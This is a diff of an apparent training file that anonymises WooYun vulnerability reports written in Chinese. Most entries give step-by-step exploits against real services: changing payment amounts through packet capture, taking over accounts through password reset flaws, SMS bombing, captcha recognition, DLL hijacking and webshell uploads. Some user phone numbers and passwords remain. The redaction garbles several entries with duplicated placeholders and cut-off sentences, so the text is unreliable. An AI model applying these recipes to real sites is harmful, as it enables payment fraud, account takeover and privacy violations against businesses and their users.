-**POC**: 这就是我们的目标网站，红箭头处，就是我们今天存在漏洞的功能，不说了，载入我们如图所示，随便填一个账号:libin好了，载入了，可以看见图上的账号注册邮箱是打码的，怎么办呢?这时候我们的burp神器已经开启了，所以现在点击发送好了，在返回的数据包里，我们可以清楚的看见：该用户的邮箱地址,同理，通过这样的方法我们可以获取到所有用户的邮箱帐号，应该可以充实一下社工库什么的好了，为了增加说服力我再附图一张:方便验证:http://www.leyou.com.cn/user/findpwstep 忘记密码处
+**POC**: 这就是我们的目标网站，红箭头处，就是我们今天存在漏洞的功能，不说了，载入我们如图所示，随便填一个账号:libin好了，载入了，可以看见图上的账号注册邮箱是打码的，怎么办呢?这时候我们的burp神器已经开启了，所以现在点击发送好了，在返回的数据包里，我们可以清楚的看见：该用户的邮箱地址,同理，通过这样的方法我们可以获取到所有用户的邮箱帐号，应该可以充实一下社工库什么的好了，为了增加说服力我再附图一张:方便验证:https://example.com/[已脱敏] 忘记密码处
 
 **绕过**: 直接利用
 
@@ -3592,7 +3592,7 @@
 
 ---
 ### [wooyun-2014-049813] 17WO手机验证码绕过可任意修改其他用户密码
-**厂商**: 中国联通 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -3625,7 +3625,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 浙江电信果粉部落网站逻辑漏洞 首次登陆可以送300M流量，但是因为逻辑漏洞，可以无限次刷流量。可通过无限次调用 g.10006.co/lq 无限次刷流量。此漏洞在12月5日前有效，目前可能已修复。另外，浙江电信所有活动网站*.zj189.cn均存在通过修改COOKIE可以伪造用户身份登陆的问题。登陆后可以查看用户个人信息，办理流量包等业务；P.S 这里还有一个完全不需要验证的读取用户真实姓名和套餐名的接口：---------------------------POST /errnav/getAData HTTP/1.1Host: s.zj189.cnConnection: keep-aliveContent-Length: 26Cache-Control: max-age=0Accept: */*Origin: http://s.zj189.cnX-Requested-With: XMLH
+**详情**: 浙江电信果粉部落网站逻辑漏洞 首次登陆可以送300M流量，但是因为逻辑漏洞，可以无限次刷流量。可通过无限次调用 g.10006.co/lq 无限次刷流量。此漏洞在12月5日前有效，目前可能已修复。另外，浙江电信所有活动网站*.zj189.cn均存在通过修改COOKIE可以伪造用户身份登陆的问题。登陆后可以查看用户个人信息，办理流量包等业务；P.S 这里还有一个完全不需要验证的读取用户真实姓名和套餐名的接口：---------------------------POST /errnav/getAData HTTP/1.1Host: s.zj189.cnConnection: keep-aliveContent-Length: 26Cache-Control: max-age=0Accept: */*Origin: https://example.com/[已脱敏] XMLH
 
 **POC**: 刷流量的漏洞目前可能已经被修复，否则我也不会公开。以下是刷成功的截图：另外的几个漏洞目前均有效，大家可以测试。
 
@@ -3647,7 +3647,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天下午有朋友推荐我下载西秦好购买东西、因为西秦好购的东西比美团糯米便宜。然后我就用我的2G网速下载了APP（买不起3G 4G手机。。。）到晚上十点、终于下载好了。打开一看、里面的东西还真的要便宜几块钱。作为一个吃货、第一反应肯定就是要逛美食栏目.发现排在第一的就是一直都想去吃的锦江大酒店海鲜自助餐，果断点进去买一份！好贵，，吃不起咋办？所以重点就来了，重点就来了，重点就来了：1、点击购买2、选择好购金币支付（随便选择使用多少），下面的选择支付宝微信都行3、打开抓包神器开始抓包，然后点击确认支付4、进入付款界面时不付款、反回。5、去看看自己的累计积分吧原理应该是负负得正、逻辑错误。
+**详情**: 今天下午有朋友推荐我下载西秦好购买东西、因为西秦好购的东西比某外卖平台糯米便宜。然后我就用我的2G网速下载了APP（买不起3G 4G手机。。。）到晚上十点、终于下载好了。打开一看、里面的东西还真的要便宜几块钱。作为一个吃货、第一反应肯定就是要逛美食栏目.发现排在第一的就是一直都想去吃的锦江大酒店海鲜自助餐，果断点进去买一份！好贵，，吃不起咋办？所以重点就来了，重点就来了，重点就来了：1、点击购买2、选择好购金币支付（随便选择使用多少），下面的选择某电商平台某互联网公司都行3、打开抓包神器开始抓包，然后点击确认支付4、进入付款界面时不付款、反回。5、去看看自己的累计积分吧原理应该是负负得正、逻辑错误。
 
 **POC**: 用积分购买：然后就买成功了：
 
@@ -3691,9 +3691,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 经常有学生来问我们论文相似度检测的事情，我们没有买这个系统啊，有同学告诉我超星有一个大雅相似度检测，可以免费检测相似的比例，但是查看具体的相似段落的时候，需要付费了用fiddle截包，修改一下fee字段的值为0.01（不能修改为0，支付宝那边有验证）http://dsa.dayainfo.com/OK，支付完成可以查看详细报告了。
+**详情**: 经常有学生来问我们论文相似度检测的事情，我们没有买这个系统啊，有同学告诉我超星有一个大雅相似度检测，可以免费检测相似的比例，但是查看具体的相似段落的时候，需要付费了用fiddle截包，修改一下fee字段的值为0.01（不能修改为0，某电商平台那边有验证）https://example.com/[已脱敏]
 
-**POC**: http://dsa.dayainfo.com/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3715,7 +3715,7 @@
 
 **详情**: 废话不多说直接看下面 ↓
 
-**POC**: http://www.dy4g.com/index.php?act=goods&goods_id=2287选择这个iphone6s  有运费的购买 别问我为什么要选择有运费的，然后直接发包就行了 由于限购一个号买一个就没办法继续了上次购买成功的记录
+**POC**: https://example.com/[已脱敏]  有运费的购买 别问我为什么要选择有运费的，然后直接发包就行了 由于限购一个号买一个就没办法继续了上次购买成功的记录
 
 **绕过**: 直接利用
 
@@ -3735,7 +3735,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先注册一个大疆的账号，打开大疆的商城，挑选一件商品进入点击购买http://store.dji.com/cn/product/phantom-4然后跳转进入了购买页面https://store.dji.com/cn/buy/checkout?t=bn&i=4231&q=1&bind_care_id=0打开fiddler进行拦截，咿呀，居然不行，证书有强制握手。那试试把https改成http试试呢？居然可以访问填写完所有信息后，选择【银联】支付 点击提交订单然后选择支付银行。开始拦截https://store.dji.com/cn/transactions/32457360e54d332213645731228b456c此接口有个total的参数，改为1返回了一个支付宝的支付接口，打开支付界面不付款。再次调用此接口，修改total为实际支付金额，然后开始付款1元大疆到手！
+**详情**: 首先注册一个大疆的账号，打开大疆的商城，挑选一件商品进入点击购买https://example.com/[已脱敏] 点击提交订单然后选择支付银行。开始拦截https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3823,7 +3823,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://ideaclub.lenovo.com.cn/club/index.php?m=goods&c=lists还是这个积分商城、 看我怎么用最低的积分换最高积分的礼物的~1. 我先挑选出我最喜欢的礼物，并复制下goods_id=1419f75d406811e3ae7601beb44c5ff72. 选择积分最低的礼物兑换（5积分的杯子），并填好相关信息，抓包修改goods_id替换为1419f75d406811e3ae7601beb44c5ff73. 这里显示兑换成功，虽然显示的是被子兑换成功，但是兑换记录里，就不相同了到这我们心仪的礼物要30积分，我只花5积分就兑换来了，是不是很划算？
+**详情**: https://example.com/[已脱敏] 看我怎么用最低的积分换最高积分的礼物的~1. 我先挑选出我最喜欢的礼物，并复制下goods_id=1419f75d406811e3ae7601beb44c5ff72. 选择积分最低的礼物兑换（5积分的杯子），并填好相关信息，抓包修改goods_id替换为1419f75d406811e3ae7601beb44c5ff73. 这里显示兑换成功，虽然显示的是被子兑换成功，但是兑换记录里，就不相同了到这我们心仪的礼物要30积分，我只花5积分就兑换来了，是不是很划算？
 
 **POC**: (见原文)
 
@@ -3833,8 +3833,8 @@
 ---
 
 ---
-### [wooyun-2014-058242] 新版中国联通验证码可被简单识别（验证码识别实例及演示代码）
-**厂商**: 中国联通 | **年份**: 2014 | **类型**: 内容安全
+### [wooyun-2014-058242] 新版某运营商验证码可被简单识别（验证码识别实例及演示代码）
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 内容安全
 
 **元思考**: 触发信号: 功能测试
 
@@ -3845,9 +3845,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新版中国联通验证码可被简单的处理就能识别，识别率接近百分之百，和没有验证码有啥区别呢?这个可以调用用来短信轰炸机一类的恶意平台发送垃圾短信，同样对用户安全造成威胁。
+**详情**: 新版某运营商验证码可被简单的处理就能识别，识别率接近百分之百，和没有验证码有啥区别呢?这个可以调用用来短信轰炸机一类的恶意平台发送垃圾短信，同样对用户安全造成威胁。
 
-**POC**: 新版中国联通验证码可被简单的处理就能识别，识别率接近百分之百，和没有验证码有啥区别呢?这个可以调用用来短信轰炸机一类的恶意平台发送垃圾短信，同样对用户安全造成威胁。地址：https://upay.10010.com/npfweb/NpfCellWeb/NpfverifyCode/getVerifyCode.action?timestamp=0.5371090464926236测试地址：http://www.fox163.com/UniconTest.aspx识别代码：public String GetCheckString(Bitmap bitmap) {UnCodebase ud = new
+**POC**: 新版某运营商验证码可被简单的处理就能识别，识别率接近百分之百，和没有验证码有啥区别呢?这个可以调用用来短信轰炸机一类的恶意平台发送垃圾短信，同样对用户安全造成威胁。地址：https://example.com/[已脱敏] String GetCheckString(Bitmap bitmap) {UnCodebase ud = new
 
 **绕过**: 直接利用
 
@@ -3867,9 +3867,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 点击购买，然后抓包。看到两个414，就是金额。接着我们来修改为1。提交看看可以看到变成1元了，但有可能是假象，最后点击支付宝支付。嘿嘿，变成1元了，马上买娃娃。只要支付1元就行了，这里我就不演示了。
+**详情**: 点击购买，然后抓包。看到两个414，就是金额。接着我们来修改为1。提交看看可以看到变成1元了，但有可能是假象，最后点击某电商平台支付。嘿嘿，变成1元了，马上买娃娃。只要支付1元就行了，这里我就不演示了。
 
-**POC**: 点击购买，然后抓包。看到两个414，就是金额。接着我们来修改为1。提交看看可以看到变成1元了，但有可能是假象，最后点击支付宝支付。嘿嘿，变成1元了，马上买娃娃。下面是支付成功的订单，根据单号请取消该订单下面这个订单1分钱支付1千多的商品，请删除
+**POC**: 点击购买，然后抓包。看到两个414，就是金额。接着我们来修改为1。提交看看可以看到变成1元了，但有可能是假象，最后点击某电商平台支付。嘿嘿，变成1元了，马上买娃娃。下面是支付成功的订单，根据单号请取消该订单下面这个订单1分钱支付1千多的商品，请删除
 
 **绕过**: 直接利用
 
@@ -3877,8 +3877,8 @@
 ---
 
 ---
-### [wooyun-2011-01611] QQ我的资讯广告框设计者粗心问题3月16日
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2011-01611] 某互联网公司我的资讯广告框设计者粗心问题3月16日
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -3911,7 +3911,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 实例：http://www.yawsj.gov.cn/install/有上一个漏洞，发现的！点击下一步点击跳过点击跳过可以修改密码了测试可行！
+**详情**: 实例：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3955,7 +3955,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我在这里选择了两个云主机一台5,647元一台5,642元在购物车里，我们看到可以选择主机数量，那个数量选了之后有一个ajax的处理这里我找到这个地址：http://www.xinnet.com/online/shopcart.do?method=updateShopCart&purchaseYears=%202&timeUnit=Y&uuid=D0D9BA74BA0A48CDA6DC22E0A5A12227&selectType=a“%20”之后跟的就是我选择的年数，我这里改成-1，然后把这个URL在浏览器里提交下，这时可以看到购物车中相应的产品变成了负数，然后就...
+**详情**: 我在这里选择了两个云主机一台5,647元一台5,642元在购物车里，我们看到可以选择主机数量，那个数量选了之后有一个ajax的处理这里我找到这个地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4001,7 +4001,7 @@
 
 **详情**: 事情是这样的，老爹充话费冲多了，电信送了他一只联想的手机嗯，这就是传说中的充话费送的手机。最近闲着没事就折腾各种手机，反正没啥用，就拿来测测呗。测试机型:A355e测试VUBE UI版本：A355e_S020_20141229测试步骤：向测试手机拨打电话，然后这个时候往上滑动，进入自定义短信回复界面进入短信回复界面以后，在联系人框那里随便输入一个数字，比如一般手机号开头都是1，这样就可以读到所有联系人了受影响的部分机型：A820t、S898t其他的就没再看了，反正很多电信充话费送手机的肯定都有这个问题
 
-**POC**: 证明视频：链接: http://pan.baidu.com/s/1pJ9NskN 密码: 4qdq
+**POC**: 证明视频：链接: https://example.com/[已脱敏] 密码: 4qdq
 
 **绕过**: 直接利用
 
@@ -4023,7 +4023,7 @@
 
 **详情**: 360极速浏览器、360安全浏览器默认开启网站名片的功能，网站名片在页面刚跳到某地址但并未返回消息或加载完时即可显示该网站名片，此处存在安全风险。360安全卫士网购保镖也存在同样的问题，在页面页面刚跳到某地址但并未返回消息或加载完时即提示该网站安全、360正保护网购安全，此处存在同样的安全风险。风险场景：A页面含有跳转到B的代码，若B页面未加载则依然显示A页面，但网站名片及网购保镖已经提示A页面安全了。利用加载时间（有的长达10多秒）或者一些302等异常跳转可以在A页面上做很多事情，因为360各种提示已经表明该页面是安全的。漏洞利用条件在于寻找加载时间比较长的网址或者异常302跳转，一般5秒及以上的就可以做很多事情了，符合条件的应该不太难找。
 
-**POC**: 以淘宝为例Fake Taobao<script language="javascript" type="text/javascript">window.location.href="http://mpp.taobao.com/buildconnection.do?ctype=login&nkh=taobaotest&appId=1064&token=1c2a0d3629a5f353eab8ee5f32a36d726de318dd5498226671b0k3s3x0b4f8c164&domain=taobao.org&stream=true&t=1427374491128";</script>以
+**POC**: 以某电商平台为例Fake Taobao<script language="javascript" type="text/javascript">window.location.href="https://example.com/[已脱敏]";</script>以
 
 **绕过**: 直接利用
 
@@ -4087,7 +4087,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 大歌星 http://www.dagexing.com首先注册帐号，登录大歌星网页选择一键订房功能，输入验证码原价176的套餐抓包改价格参数跳转到支付页面最终1元支付套餐
+**详情**: 大歌星 https://example.com/[已脱敏]
 
 **POC**: 已经证明
 
@@ -4098,7 +4098,7 @@
 
 ---
 ### [wooyun-2012-07896] 某电信一分钱续费宽带
-**厂商**: 中国电信某省 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某运营商某省 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -4153,7 +4153,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 绕过短信轰炸：万达wifi服务http://portal.wanhui.cn/页面限制为每60秒发送验证码，通过burp重发攻击可以绕过此限制，造成短信轰炸十几秒之内连续发了数条url跳转http://app.wanhui.cn/    万汇网appr参数没做限制，可以跳转到任何网站，包括钓鱼站点http://app.wanhui.cn/downloadlink?r=http://www.baidu.comhttp://app.wanhui.cn/test/downloadlink?r=http://www.baidu.com信息泄露http://www.wanda-cti.com/  万达文化旅游规划研究院www.wanda-cti.com/test.php
+**详情**: 绕过短信轰炸：万达wifi服务https://example.com/[已脱敏]    万汇网appr参数没做限制，可以跳转到任何网站，包括钓鱼站点https://example.com/[已脱敏]  万达文化旅游规划研究院www.wanda-cti.com/test.php
 
 **POC**: 已经证明
 
@@ -4207,8 +4207,8 @@
 ---
 
 ---
-### [wooyun-2015-0141401] 百度软件管理可信路径劫持
-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0141401] 某搜索引擎软件管理可信路径劫持
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 参数注入
 
@@ -4221,7 +4221,7 @@
 
 **详情**: 漏洞1：调用CreateProcess这个API时，由于没有使用双引号包围参数路径，导致创建进程时路径截断，直接运行C:\Program.exe程序。漏洞2：创建的服务项BDSoftMgrSvc指定的ImagePath由于没有使用双引号包围参数路径，导致服务启动时路径截断，直接以SYSTEM权限运行C:\Program.exe程序。
 
-**POC**: 测试版本：**.**.**.**4（官方最新版本，更新日期为2015-07-13），截图如下：安装百度软件管理到操作系统上，随后放一个名为Program.exe的程序到C盘根目录下，比如复制C:\Windows\System32\calc.exe到C:\Program.exe。双击桌面图标打开百度软件管理，可以看到先后创建了两个Program.exe进程，其中一个以SYSTEM权限启动，如下图所示：BDSoftMgr的子进程创建参数为（没有双引号）：C:\Program Files\Baidu\BaiduSoftMgr\**.**.**.**4\BDSWAcc.exe 2564 393842 
+**POC**: 测试版本：**.**.**.**4（官方最新版本，更新日期为2015-07-13），截图如下：安装某搜索引擎软件管理到操作系统上，随后放一个名为Program.exe的程序到C盘根目录下，比如复制C:\Windows\System32\calc.exe到C:\Program.exe。双击桌面图标打开某搜索引擎软件管理，可以看到先后创建了两个Program.exe进程，其中一个以SYSTEM权限启动，如下图所示：BDSoftMgr的子进程创建参数为（没有双引号）：C:\Program Files\Baidu\BaiduSoftMgr\**.**.**.**4\BDSWAcc.exe 2564 393842 
 
 **绕过**: 截断攻击
 
@@ -4229,8 +4229,8 @@
 ---
 
 ---
-### [wooyun-2011-03899] 腾讯将乌云列入黑名单
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2011-03899] 某互联网公司将乌云列入黑名单
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -4263,9 +4263,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 宝驾租车 私家车共享平台，严重的逻辑缺陷，导致可秒改任意账号下面以官方手机号测试，我们从这个页面 http://www.baojia.com/about/contact/发现一枚 18811157951首先验证一下手机号是不是已经注册，这个是在重置密码前的，然后 通过http://open.baojia.com/account/resetpwd/这里使用我注册的账号，正常找回密码抓包发现，，，修改密码的请求竟然是get请求我们将phoneNumber 改为18811157951 后重新发包密码修改为 a123456
+**详情**: 宝驾租车 私家车共享平台，严重的逻辑缺陷，导致可秒改任意账号下面以官方手机号测试，我们从这个页面 https://example.com/[已脱敏] 18811157951首先验证一下手机号是不是已经注册，这个是在重置密码前的，然后 通过https://example.com/[已脱敏] 改为18811157951 后重新发包密码修改为 a123456
 
-**POC**: 宝驾租车 私家车共享平台，严重的逻辑缺陷，导致可秒改任意账号下面以官方手机号测试，我们从这个页面 http://www.baojia.com/about/contact/发现一枚 18811157951首先验证一下手机号是不是已经注册，这个是在重置密码前的，然后 通过http://open.baojia.com/account/resetpwd/这里使用我注册的账号，正常找回密码抓包发现，，，修改密码的请求竟然是get请求我们将phoneNumber 改为18811157951 后重新发包密码修改为 a123456
+**POC**: 宝驾租车 私家车共享平台，严重的逻辑缺陷，导致可秒改任意账号下面以官方手机号测试，我们从这个页面 https://example.com/[已脱敏] 18811157951首先验证一下手机号是不是已经注册，这个是在重置密码前的，然后 通过https://example.com/[已脱敏] 改为18811157951 后重新发包密码修改为 a123456
 
 **绕过**: 直接利用
 
@@ -4285,9 +4285,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 购买课程：http://www.feizhiyi.com/User/buycourse.html提交订单，抓包，修改参数balance：http://www.feizhiyi.com/User/createorder.html订单提交成功，查看我的飞币余额：再来看下支付漏洞：抓包，如下接口，修改金额：http://www.feizhiyi.com/public/paymentlink支付金额未验证，跳转到支付宝支付：以上刷的飞币在官方账号"admin"里面，友情测试，并未进行飞币购买课程等操作，请厂商处理
+**详情**: 购买课程：https://example.com/[已脱敏]"admin"里面，友情测试，并未进行飞币购买课程等操作，请厂商处理
 
-**POC**: 。找回密码：http://www.feizhiyi.com/user/findpassword.html来找回一下admin的密码：查看修改密码的js代码：发现修改密码的接口并未验证验证码，构造POST请求，直接提交：重置成功：登录成功：
+**POC**: 。找回密码：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4329,7 +4329,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用户资料上能户获取用户邮箱http://passport.18touch.com/4056754找回密码流程同一个游览器开两个页面，分别输入自己和对方的邮箱先发送对方的邮箱验证码后，发送自己邮箱的验证码之后利用自己受到的邮箱验证码输入到对方验证码框中，后跳转至密码设置页面，设置密码即可登录验证zhuowenlong@18touch.com 123123
+**详情**: 用户资料上能户获取用户邮箱https://example.com/[已脱敏] 123123
 
 **POC**: 如上
 
@@ -4351,7 +4351,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 几乎每条评论都到几千，微博几万。。。弱口令：http://huixin.zymk.cn/admin.phpadminadmin在进入这里http://huixin.zymk.cn/Public/upload.php?path=upload/img&inputid=pic老是上传不上去，无语鸟。。。熟悉的界面。。。貌似改路径才可以上传。。被加时间戳了，不会突破。。求大牛们给点姿势！在友情链接可影响首页！ 非常严重把他带到钓鱼网站，呵呵。。。首页弹http://www.mkzhan.com/index.php/cindex/index在“我是作者”上传漫画可以加入GIF89a 绕过检测一句话上传封面那里上传 jpg;asp这还有一处支付漏洞在购买VIP那里抓包，然后你懂得。。。site：https://mapi.alipay.com/gateway.do?_input_charset=utf-
+**详情**: 几乎每条评论都到几千，某社交平台几万。。。弱口令：https://example.com/[已脱敏] 非常严重把他带到钓鱼网站，呵呵。。。首页弹https://example.com/[已脱敏] 绕过检测一句话上传封面那里上传 jpg;asp这还有一处支付漏洞在购买VIP那里抓包，然后你懂得。。。site：https://example.com/[已脱敏]
 
 **POC**: 各种姿势都用过了。求技巧。。。私聊客服想坑个礼物的，居然一直不在线给个小礼品真的有那么难吗 o(∩_∩)o
 
@@ -4361,8 +4361,8 @@
 ---
 
 ---
-### [wooyun-2015-0109711] 腾讯QQ"安全防护"程序DLL加载未验证漏洞
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0109711] 某互联网公司某互联网公司"安全防护"程序DLL加载未验证漏洞
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -4373,7 +4373,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 前几天腾讯更新了7.1版本.然后意外的发现腾讯的桌面快捷方式指向的QQProtect.exe程序居然存在一个使用非系统DLL的导入然后好奇了.作为一个"安全防护"程序,使用导入表导入自定义DLL.这不是找利用? 难道像杀软一样有目录保护?然后copy出来再cpoy进去.成功的丢进去了.所以结论是木有这个自我保护,好吧.现在就已经看到一处摆在明面上的DLL加载问题了.眼睛一扫发现tx使用了zlib.dll和tinyxml.dll 一般很多人在使用这俩DLL的时候都忘记去验证签名.测试下.通过修改版权信息来破坏签名,双击桌面图标,果然成功跑起来了使用XT看下,果然把我们修改过的zlib加载上了(此时其实从安全角度考虑已经无需其他操作了.这情况下弹窗假窗口什么的都可以做了)输入密码登陆.等待10分钟.木有被踢出(说明自身定时检测功能没有涵盖QQProtect的组件)然后将目录下的zlib.dll
+**详情**: 前几天某互联网公司更新了7.1版本.然后意外的发现某互联网公司的桌面快捷方式指向的某互联网公司Protect.exe程序居然存在一个使用非系统DLL的导入然后好奇了.作为一个"安全防护"程序,使用导入表导入自定义DLL.这不是找利用? 难道像杀软一样有目录保护?然后copy出来再cpoy进去.成功的丢进去了.所以结论是木有这个自我保护,好吧.现在就已经看到一处摆在明面上的DLL加载问题了.眼睛一扫发现tx使用了zlib.dll和tinyxml.dll 一般很多人在使用这俩DLL的时候都忘记去验证签名.测试下.通过修改版权信息来破坏签名,双击桌面图标,果然成功跑起来了使用XT看下,果然把我们修改过的zlib加载上了(此时其实从安全角度考虑已经无需其他操作了.这情况下弹窗假窗口什么的都可以做了)输入密码登陆.等待10分钟.木有被踢出(说明自身定时检测功能没有涵盖某互联网公司Protect的组件)然后将目录下的zlib.dll
 
 **POC**: (见原文)
 
@@ -4449,8 +4449,8 @@
 ---
 
 ---
-### [wooyun-2011-02956] 新浪微博API申请手机号码验证无限发
-**厂商**: 新浪 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2011-02956] 某社交平台某社交平台API申请手机号码验证无限发
+**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -4615,7 +4615,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 瑞星多款杀毒软件在启动时或运行中会加载一些不带路径的dll文件（这些文件没有随杀毒软件一起安装），导致恶意攻击者可以伪造该DLL文件放置于可能的加载路径如系统目录下用于劫持，绕过杀软自身防护，实现提权或关闭杀软安全防护等动作，危害用户安全。所有测试版本均为官网10月11日16时后更新的版本。瑞星杀毒软件V16软件版本：24.00.11.49ravmond.exe---->rexfs.dllrstray.exe---->my32.dllrsmain.exe---->my32.dll瑞星杀毒软件2011软件版本：23.00.96.79ravmond.exe---->logproxy.dll瑞星全功能安全软件2011软件版本：23.00.98.52ravmond.exe---->logproxy.dllravmond.exe---->spoon_if.dllrstray.exe---->logp
+**详情**: 瑞星多款杀毒软件在启动时或运行中会加载一些不带路径的dll文件（这些文件没有随杀毒软件一起安装），导致恶意攻击者可以伪造该DLL文件放置于可能的加载路径如系统目录下用于劫持，绕过杀软自身防护，实现提权或关闭杀软安全防护等动作，危害用户安全。所有测试版本均为官网10月11日16时后更新的版本。瑞星杀毒软件V16软件版本：[IP已脱敏]ravmond.exe---->rexfs.dllrstray.exe---->my32.dllrsmain.exe---->my32.dll瑞星杀毒软件2011软件版本：[IP已脱敏]ravmond.exe---->logproxy.dll瑞星全功能安全软件2011软件版本：[IP已脱敏]ravmond.exe---->logproxy.dllravmond.exe---->spoon_if.dllrstray.exe---->logp
 
 **POC**: (见原文)
 
@@ -4625,7 +4625,7 @@
 ---
 
 ---
-### [wooyun-2012-014709] 绕过腾讯手机管家防盗功能
+### [wooyun-2012-014709] 绕过某互联网公司手机管家防盗功能
 **厂商**: 安全管家 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 后台管理
@@ -4703,9 +4703,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:http://gopurchase.haier.com/GOPurchase/page/Base/http://gopurchase.haier.com/Gopurchase/page/Base/LSupplyerIntroduceAppraisal/LSupplyerRegist/LSupplyerRegistInfo.aspx?state=2&userNo=hexinjixie什么都有了http://gopurchase.haier.com/GOPurchase/page/Base/LSupplyerIntroduceAppraisal/LSupplyerRegist/LSupplyerRegistInfo.aspx?state=2&userNo=bogesihttp://gopurchase.haier.com/GOPurchase/page/Base/LSupplyer
+**详情**: inurl:https://example.com/[已脱敏]
 
-**POC**: http://gopurchase.haier.com/GOPurchase/page/Base/LSupplyerIntroduceAppraisal/LSupplyerRegist/LSupplyerRegistInfo.aspx?state=2&userNo=whyihuihttp://gopurchase.haier.com/GOPurchase/page/Base/LSupplyerIntroduceAppraisal/LSupplyerRegist/LSupplyerRegistInfo.aspx?state=2&userNo=bogesihttp://gopurchase.hai
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4749,7 +4749,7 @@
 
 **详情**: 首先我得承认系统比刚上线那会安全性高了很多，关闭了那些不和谐的子系统，但是在密码找回功能上，仍然存在设计缺陷1#用户信息泄漏密码找回第一步，输入用户名 /手机 /身份证号/邮箱 均可，进入下一步抓包可以看到，系统返回了该用户的身份证号、电话号码、邮箱、姓名（低级用户、未认证用户，获取到的信息相应减少）可能有人会问，如何获取到用户的登录名，很简单，系统里有，在网页应用的评论处，有大批用户名2#我不得不吐槽这个点赞功能，我一个人给点了34次3#短信任意发送，无次数限制，在绑定手机处，对已绑定的手机号进行修改，在输入框中，输入短信的接收目标，然后开始搞，抓包，重放应该还有其它地方，得好好找找重现的话，以这位哥们为例joceazheng吧，只能重现找回密码了，如果无聊的话，可以给他找回密码抓包重放，短信轰炸
 
-**POC**: http://www.ixm.gov.cn/dis/ids/findUserByFilter?ran=&userName=joceazheng
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4791,7 +4791,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 找了几个没zend的文件来看看 。第一处ali/notify_url.php中$alipayNotify = new AlipayNotify($aliapy_config);$verify_result = $alipayNotify->verifyNotify();if($verify_result) {//验证成功///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////请在这里加上商户的业务逻辑程序代//——请根据您的业务逻辑来编写程序（以下代码仅作参考）——//获取支付宝的通知返回参数，可参考技术文档中服务器异步通知参数列表$out_trade_no	= $_POST['
+**详情**: 找了几个没zend的文件来看看 。第一处ali/notify_url.php中$alipayNotify = new AlipayNotify($aliapy_config);$verify_result = $alipayNotify->verifyNotify();if($verify_result) {//验证成功///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////请在这里加上商户的业务逻辑程序代//——请根据您的业务逻辑来编写程序（以下代码仅作参考）——//获取某电商平台的通知返回参数，可参考技术文档中服务器异步通知参数列表$out_trade_no	= $_POST['
 
 **POC**: 见上面。
 
@@ -4813,7 +4813,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上次发过了,自己去测试发现多了个hidden和GET:money=还有表单的hidden多了几个参数。http://app.junph.com/Shopping/OrderDetail.aspx?OrderCode=2012072978871
+**详情**: 上次发过了,自己去测试发现多了个hidden和GET:money=还有表单的hidden多了几个参数。https://example.com/[已脱敏]
 
 **POC**: 给剑心送件衣服吧。嗯。。
 
@@ -4823,7 +4823,7 @@
 ---
 
 ---
-### [wooyun-2014-051449] RenderBus通过支付宝充值存在汇率逻辑漏洞
